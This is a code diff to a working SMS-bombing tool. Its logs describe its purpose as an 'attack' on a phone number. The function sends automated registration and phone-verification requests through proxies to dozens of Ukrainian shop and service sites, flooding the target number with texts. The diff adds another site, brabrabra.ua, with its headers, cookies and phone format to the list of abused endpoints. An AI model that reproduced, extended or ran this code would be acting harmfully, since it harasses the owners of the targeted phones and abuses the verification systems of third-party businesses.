@@ -22,7 +22,7 @@ from headers_main import (
     headers_uvape, cookies_uvape, headers_terravape, cookies_terravape,
     headers_moyo, cookies_moyo, headers_sushiya, headers_zolota, cookies_zolota,
     headers_avtoria, cookies_avtoria, headers_elmir, cookies_elmir, headers_elmir_call,
-    cookies_elmir_call
+    cookies_elmir_call, headers_brabra, cookies_brabra
 )
 import asyncpg
 import config
@@ -1364,6 +1364,7 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
     formatted_number5 = f"+{number[:3]}({number[3:6]}){number[6:9]}-{number[9:11]}-{number[11:]}"
     formatted_number6 = f"+{number[:3]}({number[3:5]}){number[5:8]}-{number[8:10]}-{number[10:]}"
     formatted_number7 = f"+{number[:3]}({number[3:6]}) {number[6:9]}-{number[9:11]}-{number[11:]}"
+    formatted_number9 = f"+{number[:2]} ({number[2:5]}) {number[5:8]}-{number[8:10]}-{number[10:]}"
     raw_phone = f"({number[3:6]})+{number[6:9]}+{number[9:]}"
 
     logging.info(f"Запуск атаки на номер {number}")
@@ -1465,6 +1466,7 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
         bounded_request("https://dnipro-m.ua/ru/phone-verification/", **with_proxy({"json": {"phone": number}, "headers": headers_dnipro, "cookies": cookies_dnipro})),
         bounded_request("https://my.ctrs.com.ua/api/auth/login", **with_proxy({"json": {"identity": "+" + number}, "headers": headers_citrus, "cookies": cookies_citrus})),
         bounded_request("https://auth.easypay.ua/api/check", **with_proxy({"json": {"phone": number}, "headers": headers_easypay})),
+        bounded_request("https://brabrabra.ua/auth/modal.php?login=yes&ajax_mode=Y", **with_proxy({"data": {"sessid": cookies_brabra.get("PHPSESSID", ""), "step": "1", "phone": formatted_number9, "ajax_mode": "Y"}, "headers": headers_brabra, "cookies": cookies_brabra})),
         bounded_request("https://sandalini.ua/ru/signup/", **with_proxy({"data": {"data[firstname]": "деня", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}, "headers": headers})),
         bounded_request("https://uvape.pro/index.php?route=account/register/add", **with_proxy({"data": {"firstname": "деня", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, "headers": headers_uvape, "cookies": cookies_uvape})),
         bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", **with_proxy({"data": {"phone": formatted_number4, "only_sms": "1"}, "headers": headers})),
@@ -1505,6 +1507,7 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
         bounded_request("https://dnipro-m.ua/ru/phone-verification/", **with_proxy({"json": {"phone": number}, "headers": headers_dnipro, "cookies": cookies_dnipro})),
         bounded_request("https://my.ctrs.com.ua/api/auth/login", **with_proxy({"json": {"identity": "+" + number}, "headers": headers_citrus, "cookies": cookies_citrus})),
         bounded_request("https://auth.easypay.ua/api/check", **with_proxy({"json": {"phone": number}, "headers": headers_easypay})),
+        bounded_request("https://brabrabra.ua/auth/modal.php?login=yes&ajax_mode=Y", **with_proxy({"data": {"sessid": cookies_brabra.get("PHPSESSID", ""), "step": "1", "phone": formatted_number9, "ajax_mode": "Y"}, "headers": headers_brabra, "cookies": cookies_brabra})),
         bounded_request("https://sandalini.ua/ru/signup/", **with_proxy({"data": {"data[firstname]": "деня", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}, "headers": headers})),
         bounded_request("https://uvape.pro/index.php?route=account/register/add", **with_proxy({"data": {"firstname": "деня", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, "headers": headers_uvape, "cookies": cookies_uvape})),
         bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", **with_proxy({"data": {"phone": formatted_number4, "only_sms": "1"}, "headers": headers})),
